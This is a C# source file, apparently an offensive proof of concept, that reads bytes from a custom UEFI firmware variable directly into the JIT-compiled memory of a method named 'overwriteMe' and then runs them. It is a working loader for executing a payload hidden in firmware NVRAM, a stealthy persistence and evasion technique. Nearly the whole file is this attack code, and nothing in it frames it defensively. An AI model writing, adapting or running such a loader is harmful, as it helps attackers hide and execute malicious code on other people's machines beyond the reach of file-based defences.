using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace UEFIReadCSharp
{
    class Program
    {
        // Need a way to determine how big buferLEN will be. Automate from payload.cs in UEFIWriteCSharp?
        // Can do with a build wrapper. 
        public static uint bufferLEN = 3;

        static void Main()
        {
            string variableName = "CSHARP-UEFI";
            string GUID = "{E660597E-B94D-4209-9C80-1805B5D19B69}";
            int error, retValue = 0;

            bool ret = pinvoke.SetPriv();
            if (ret is false)
                return;

            IntPtr ptrToMethod = IntPtr.Zero;
            MethodInfo myMethod = null;

	    // https://www.tophertimzen.com/blog/dotNetMachineCodeManipulation/
            myMethod = typeof(Program).GetMethod("overwriteMe");
            System.Runtime.CompilerServices.RuntimeHelpers.PrepareMethod(myMethod.MethodHandle); 
            ptrToMethod = myMethod.MethodHandle.GetFunctionPointer();
#if DEBUG
            byte[] read = readFunction(ptrToMethod);
#endif
            retValue = pinvoke.GetFirmwareEnvironmentVariableEx(variableName, GUID, ptrToMethod, bufferLEN, (uint)0);

            if (retValue == 0)
            {
                error = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                System.Console.WriteLine(error.ToString());
            }
            else
#if DEBUG
            {

                read = readFunction(ptrToMethod);
#endif
                overwriteMe();
                return;
            }
        }

         
#if DEBUG
        public static byte[] readFunction(IntPtr methodPtr)
        {
            IntPtr ptrTemp = new IntPtr(methodPtr.ToInt64());
            byte[] memory = new byte[bufferLEN];
            int t = 0;
            bool c3 = false;
            for (int i = 0; i < memory.Length; i++)
            {
                memory[i] = System.Runtime.InteropServices.Marshal.ReadByte(new IntPtr(ptrTemp.ToInt64() + i));

                if (memory[i] == 0xc3)
                {
                    c3 = true;
                }
                else if (c3 && memory[i] == 0x00)
                {
                    t++;
                    if (t == 3)
                        break;
                }
                else
                {
                    c3 = false;
                    t = 0;
                }
            }
            return memory;
        }
#endif

        public static void overwriteMe()
        {
            bool malCode = false;
            if (malCode is true)
                return;
            return;
        }
    }
}
